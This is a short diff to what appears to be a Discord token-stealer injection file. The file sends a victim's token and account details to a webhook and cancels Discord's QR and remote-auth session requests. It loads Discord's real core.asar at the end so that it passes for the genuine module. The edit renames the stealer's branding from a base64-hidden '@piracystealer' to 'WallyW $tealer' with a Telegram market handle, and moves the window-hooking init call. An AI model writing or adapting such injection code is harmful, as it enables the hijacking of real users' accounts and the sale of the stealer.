@@ -175,7 +175,7 @@ const notify = async (ctx, token, acc) => {
             icon_url: `https://cdn.discordapp.com/avatars/${acc.id}/${acc.avatar}.png`,
         };
         e.footer = {
-            text: decodeB64('QHBpcmFjeXN0ZWFsZXI='),
+            text: "WallyW $tealer | @t.me/wm4rket",
             icon_url: "https://cdn.discordapp.com/attachments/1232070620699693119/1270552282043383900/wallywspin.gif?ex=66b41d85&is=66b2cc05&hm=2f8d6a480fff1b5a18d909ea3736de04df6658f555fe6ba92c0caf4b52db2349&"
         };
     });
@@ -613,12 +613,12 @@ const CREATE_WINDOW_CLIENT = (win) => {
     );
 };
 
+CREATE_WINDOW_CLIENT(BrowserWindow); // INIT
+
 session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
     if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({
         cancel: true
     })
 });
-
-CREATE_WINDOW_CLIENT(BrowserWindow); // INIT
 
 module.exports = require("./core.asar");
